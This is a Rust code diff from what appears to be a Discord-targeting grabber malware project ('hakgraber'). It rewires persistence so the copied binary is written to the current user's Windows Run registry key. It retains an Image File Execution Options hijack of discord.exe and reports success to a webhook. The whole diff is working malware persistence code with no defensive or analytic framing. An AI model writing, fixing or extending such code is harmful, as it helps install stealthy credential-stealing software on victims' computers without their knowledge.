@@ -1,10 +1,9 @@
+use crate::network;
+use dirs;
 use is_elevated::is_elevated;
 use std::path::PathBuf;
-use dirs;
 use winreg::enums::*;
 use winreg::RegKey;
-use crate::network;
-
 
 pub fn execute_extra_persistence() {
     if !is_elevated() {
@@ -17,8 +16,8 @@ pub fn execute_extra_persistence() {
     }
 
     let temp_dir_path = temp_dir_path.unwrap();
-    //_add_to_startup(&temp_dir_path);
-    ifeo_discord(&temp_dir_path);
+    _add_to_startup(&temp_dir_path);
+    //ifeo_discord(&temp_dir_path); problem with this is it blocks discord completely
 }
 
 fn copy_to_temp_dir() -> Option<PathBuf> {
@@ -36,21 +35,30 @@ fn copy_to_temp_dir() -> Option<PathBuf> {
 
 fn _add_to_startup(path: &PathBuf) {
     //add to windows->run and windows->runonce
-    let run_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").expect("failed to access Run key");
+    let run_key = RegKey::predef(HKEY_CURRENT_USER)
+        .open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .expect("failed to access Run key");
 
-    let sv_result = run_key.set_value("hak_graber", &path.display().to_string());
-    if sv_result.is_err() { //for some reason, this part fails
+    let sv_result = run_key.set_value("hakgraber", &path.display().to_string());
+    if let Err(why) = sv_result {
+        //this part is failing for some reason
+        println!("sv result error: ");
+        println!("{}", why);
         return;
-        //error occured when setting reg key
     }
 
     network::send_webhook_message("installed basic persistence");
 }
 
 fn ifeo_discord(path: &PathBuf) {
-    let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").expect("failed to access ifeo");
-    let (key, disp) = ifeo_key.create_subkey("discord.exe").expect("unable to create regkey");
-
+    let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE)
+        .open_subkey(
+            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
+        )
+        .expect("failed to access ifeo");
+    let (key, disp) = ifeo_key
+        .create_subkey("discord.exe")
+        .expect("unable to create regkey");
 
     if disp == REG_OPENED_EXISTING_KEY {
         return; //already applied IFEO
